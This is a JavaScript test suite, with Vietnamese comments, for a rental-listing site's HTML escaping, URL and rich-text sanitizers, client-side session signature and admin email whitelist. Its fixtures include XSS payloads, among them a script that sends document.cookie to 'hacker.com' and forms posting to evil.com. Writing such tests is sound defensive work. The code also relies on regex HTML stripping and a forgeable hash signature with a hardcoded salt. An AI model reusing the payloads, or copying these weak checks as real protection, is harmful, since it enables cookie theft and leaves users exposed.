import fs from 'fs';
import path from 'path';

console.log('======================================================================');
console.log('  BẮT ĐẦU CHẠY TEST SUITE CHO XSS DEFENSE & ZERO-TRUST LOCALSTORAGE (PLAN 8)');
console.log('======================================================================\n');

let passCount = 0;
let failCount = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ [PASS] ${message}`);
    passCount++;
  } else {
    console.error(`  ❌ [FAIL] ${message}`);
    failCount++;
  }
}

// Logic kiểm thử đối chiếu chuẩn xác với src/lib/security/sanitizer.ts
function escapeHtml(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeSafeUrl(url) {
  if (!url) return '';
  const trimmed = url.trim();
  const dangerousProtocols = /^(javascript|data|vbscript|file):/i;
  if (dangerousProtocols.test(trimmed)) {
    return '#unsafe-link-blocked';
  }
  const safeProtocols = /^(https?:\/\/|mailto:|tel:|\/)/i;
  if (!safeProtocols.test(trimmed)) {
    return `https://${trimmed}`;
  }
  return trimmed;
}

function sanitizeRichDescription(rawHtml) {
  if (!rawHtml) return '';
  let clean = rawHtml.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  clean = clean.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '');
  clean = clean.replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '');
  clean = clean.replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '');
  clean = clean.replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '');
  clean = clean.replace(/<form\b[^<]*(?:(?!<\/form>)<[^<]*)*<\/form>/gi, '');
  clean = clean.replace(/\son\w+\s*=\s*(['"]).*?\1/gi, '');
  clean = clean.replace(/\son\w+\s*=\s*[^>\s]+/gi, '');
  return clean;
}

// Logic kiểm thử đối chiếu chuẩn xác với src/lib/security/sessionIntegrity.ts
const ADMIN_WHITELIST_EMAILS = [
  'quan66934@gmail.com',
  'admin@troxinh.vn',
];
const SESSION_SALT = 'TROXINH_SECURE_SALT_2026_QIANGU';

function generateSessionSignature(user) {
  if (!user || !user.id) return '';
  const raw = `${user.id}::${user.firebaseUid || ''}::${(user.email || '').toLowerCase()}::${user.role || 'user'}`;
  const str = raw + SESSION_SALT;
  let hash = 5381;
  for (let i = 0; i < str.length; i++) {
    hash = ((hash << 5) + hash) + str.charCodeAt(i);
  }
  return (hash >>> 0).toString(16);
}

function verifySessionSignature(user, signature) {
  if (!user) return true;
  if (!signature) return false;
  const expected = generateSessionSignature(user);
  return expected === signature;
}

function isPermittedAdmin(user) {
  if (!user) return false;
  if (user.role !== 'admin') return false;
  const email = (user.email || '').trim().toLowerCase();
  return ADMIN_WHITELIST_EMAILS.includes(email);
}

// Test 1: Kiểm tra Escape HTML Entities chống XSS chuỗi cơ bản
console.log('Test 1: Kiểm tra escapeHtml chống Stored XSS cơ bản');
const maliciousInput = '<script>alert("xss")</script>&<img src=x onerror=1>';
const escaped = escapeHtml(maliciousInput);
assert(!escaped.includes('<') && !escaped.includes('>'), 'escapeHtml: Loại bỏ toàn bộ dấu < và >');
assert(escaped.includes('&lt;script&gt;') && escaped.includes('&quot;xss&quot;'), 'escapeHtml: Mã hóa đúng chuẩn HTML Entities');

// Test 2: Kiểm tra sanitizeSafeUrl chặn DOM-based XSS qua URL
console.log('\nTest 2: Kiểm tra sanitizeSafeUrl chặn các scheme nguy hiểm (javascript:, data:)');
const jsUrl = 'javascript:alert(document.cookie)';
const dataUrl = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
const vbUrl = 'vbscript:msgbox("xss")';
const normalUrl = 'zalo.me/g/troxinh';
const httpsUrl = 'https://troxinh.vn/phong-tro';

assert(sanitizeSafeUrl(jsUrl) === '#unsafe-link-blocked', 'sanitizeSafeUrl: Chặn đứng liên kết javascript: URI');
assert(sanitizeSafeUrl(dataUrl) === '#unsafe-link-blocked', 'sanitizeSafeUrl: Chặn đứng liên kết data: URI');
assert(sanitizeSafeUrl(vbUrl) === '#unsafe-link-blocked', 'sanitizeSafeUrl: Chặn đứng liên kết vbscript: URI');
assert(sanitizeSafeUrl(normalUrl) === 'https://zalo.me/g/troxinh', 'sanitizeSafeUrl: Tự động gắn https:// cho domain rút gọn');
assert(sanitizeSafeUrl(httpsUrl) === 'https://troxinh.vn/phong-tro', 'sanitizeSafeUrl: Giữ nguyên URL https an toàn');

// Test 3: Kiểm tra sanitizeRichDescription làm sạch nội dung bài đăng
console.log('\nTest 3: Kiểm tra sanitizeRichDescription loại bỏ iframe, script và inline event handlers');
const richXss = `
  <p>Phòng trọ đẹp khép kín Cầu Giấy</p>
  <script>fetch('https://hacker.com/steal?c=' + document.cookie)</script>
  <img src="valid.jpg" onerror="alert('Hacked!')" onload="steal()" />
  <iframe src="https://phishing.com"></iframe>
  <style>body { display: none; }</style>
  <form action="https://evil.com"><input name="pass"/></form>
`;
const cleaned = sanitizeRichDescription(richXss);
assert(!cleaned.includes('<script'), 'sanitizeRichDescription: Loại bỏ hoàn toàn thẻ <script>');
assert(!cleaned.includes('<iframe'), 'sanitizeRichDescription: Loại bỏ hoàn toàn thẻ <iframe>');
assert(!cleaned.includes('<form'), 'sanitizeRichDescription: Loại bỏ hoàn toàn thẻ <form>');
assert(!cleaned.includes('onerror='), 'sanitizeRichDescription: Cắt bỏ triệt để event handler onerror=');
assert(!cleaned.includes('onload='), 'sanitizeRichDescription: Cắt bỏ triệt để event handler onload=');
assert(cleaned.includes('<p>Phòng trọ đẹp khép kín Cầu Giấy</p>'), 'sanitizeRichDescription: Bảo toàn nội dung bài đăng an toàn');

// Test 4: Kiểm tra Session Integrity Checksum & Zero-Trust
console.log('\nTest 4: Kiểm tra Session Integrity Signature chống sửa đổi LocalStorage');
const validUser = {
  id: 'usr_100',
  firebaseUid: 'fb_100',
  email: 'renter@gmail.com',
  role: 'user',
};
const validSignature = generateSessionSignature(validUser);
assert(verifySessionSignature(validUser, validSignature) === true, 'verifySessionSignature: Chấp thuận phiên hợp lệ đúng chữ ký');

// Giả lập hacker mở F12 sửa role thành admin
const tamperedUser = {
  ...validUser,
  role: 'admin',
};
assert(verifySessionSignature(tamperedUser, validSignature) === false, 'verifySessionSignature: Bắt quả tang khi hacker sửa role: "admin"');

// Test 5: Kiểm tra Admin Whitelist Guard
console.log('\nTest 5: Kiểm tra isPermittedAdmin đối chiếu Whitelist email');
const realAdmin = { id: 'adm_1', email: 'quan66934@gmail.com', role: 'admin' };
const fakeAdmin = { id: 'usr_2', email: 'hacker@gmail.com', role: 'admin' };
const normalUserObj = { id: 'usr_3', email: 'user@troxinh.vn', role: 'user' };

assert(isPermittedAdmin(realAdmin) === true, 'isPermittedAdmin: Cho phép admin chính chủ trong Whitelist');
assert(isPermittedAdmin(fakeAdmin) === false, 'isPermittedAdmin: Chặn đứng tài khoản giả mạo admin ngoài Whitelist');
assert(isPermittedAdmin(normalUserObj) === false, 'isPermittedAdmin: Người dùng thường không thể truy cập admin');

// Test 6: Kiểm tra tích hợp trong ProtectedRoute.tsx và useAppStore.ts
console.log('\nTest 6: Kiểm tra tích hợp mã nguồn ProtectedRoute.tsx & useAppStore.ts');
try {
  const protectedRouteContent = fs.readFileSync(path.resolve('src/components/auth/ProtectedRoute.tsx'), 'utf-8');
  assert(protectedRouteContent.includes('isPermittedAdmin(currentUser)'), 'ProtectedRoute: Đã tích hợp Zero-Trust Admin Whitelist Guard');

  const storeContent = fs.readFileSync(path.resolve('src/store/useAppStore.ts'), 'utf-8');
  assert(storeContent.includes("state.currentUser.role = 'user'"), 'useAppStore: Đã tích hợp cơ chế tự động hạ cấp role giả mạo khi rehydrate');

  const sanitizerFile = fs.readFileSync(path.resolve('src/lib/security/sanitizer.ts'), 'utf-8');
  assert(sanitizerFile.includes('export function escapeHtml'), 'sanitizer.ts: Đã triển khai đầy đủ các hàm làm sạch XSS');

  const integrityFile = fs.readFileSync(path.resolve('src/lib/security/sessionIntegrity.ts'), 'utf-8');
  assert(integrityFile.includes('export function generateSessionSignature'), 'sessionIntegrity.ts: Đã triển khai thuật toán ký băm phiên DJB2');
} catch (e) {
  assert(false, `Lỗi đọc file kiểm tra: ${e.message}`);
}

console.log('\n======================================================================');
if (failCount === 0) {
  console.log(`🎉 TẤT CẢ ${passCount} BÀI TEST XSS DEFENSE & ZERO-TRUST ĐẠT CHUẨN 100%!`);
  console.log('======================================================================');
  process.exit(0);
} else {
  console.error(`💥 CÓ ${failCount} BÀI TEST THẤT BÀI!`);
  console.log('======================================================================');
  process.exit(1);
}
